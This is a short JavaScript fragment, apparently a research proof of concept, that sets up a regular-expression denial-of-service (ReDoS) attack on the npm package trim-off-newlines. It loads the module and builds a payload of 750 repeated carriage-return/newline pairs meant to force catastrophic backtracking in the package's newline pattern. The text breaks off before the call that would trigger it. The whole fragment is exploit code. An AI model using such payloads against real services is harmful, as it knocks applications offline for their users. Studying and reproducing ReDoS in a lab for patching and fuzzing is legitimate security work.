async function exploit() {
   // Load the vulnerable module in the controlled research environment
   const trimOffNewlines = require('trim-off-newlines');

   // Craft input to trigger catastrophic backtracking on the (?:\r|\n)+ alternation.
   // The engine must repeatedly decide whether \r or \n matches at each step.
   // A length of ~750 characters reliably pushes internal backtracking steps 
   // past common static analysis / fuzzer thresholds (e.g., 30,000) in unpatched versions.
   const payload = '\r\n'.repeat(750);

   console.log('Triggering ReDoS on trim-off-newlines...');
